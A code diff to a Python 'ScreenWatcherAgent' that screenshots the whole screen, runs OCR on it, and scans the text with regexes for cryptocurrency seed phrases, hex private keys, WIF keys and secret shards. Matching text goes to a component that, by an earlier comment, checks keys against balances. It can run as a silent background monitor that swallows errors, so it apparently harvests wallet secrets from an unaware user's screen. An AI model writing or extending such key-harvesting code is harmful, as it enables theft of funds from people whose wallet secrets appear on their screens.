@@ -20,10 +20,16 @@ class ScreenWatcherAgent:
         self.interval = interval
         self._running = False
         self._thread = None
-        self._sct = mss.mss()
+        try:
+            self._sct = mss.mss()
+        except Exception:
+            self._sct = None
 
-    def _capture_and_scan(self):
+    def _capture_and_scan(self, force=False):
         """Capture full screen and run OCR to find keys"""
+        if not self._sct: return
+        if not self._running and not force: return
+
         try:
             # Capture full screen
             screenshot = self._sct.grab(self._sct.monitors[0])
@@ -33,9 +39,23 @@ class ScreenWatcherAgent:
             text = pytesseract.image_to_string(img)
 
             if text.strip() and self.assistant:
-                # Feed to KeyReducer (handled via assistant/orchestrator)
-                # It will check against patterns and balances
-                self.assistant.feed_text(text, source="screen_watcher", context="Full Screen OCR")
+                # Specialized patterns for screen reader
+                patterns = {
+                    'mnemonic': r'\b(?:[a-z]{3,10}\s+){11,23}[a-z]{3,10}\b',
+                    'hex64': r'\b[0-9a-fA-F]{64}\b',
+                    'wif': r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b',
+                    'sss_shard': r'\b(?:shard|part|share)_[0-9a-fA-F]{16,}\b'
+                }
+
+                found = False
+                import re
+                for name, p in patterns.items():
+                    if re.search(p, text, re.IGNORECASE):
+                        found = True
+                        break
+
+                if found or force:
+                    self.assistant.feed_text(text, source="screen_reader", context="Manual Interaction" if force else "Background Monitor")
         except Exception as e:
             # Silently fail if OCR tools (tesseract) are not installed in environment
             # but log for debugging if needed
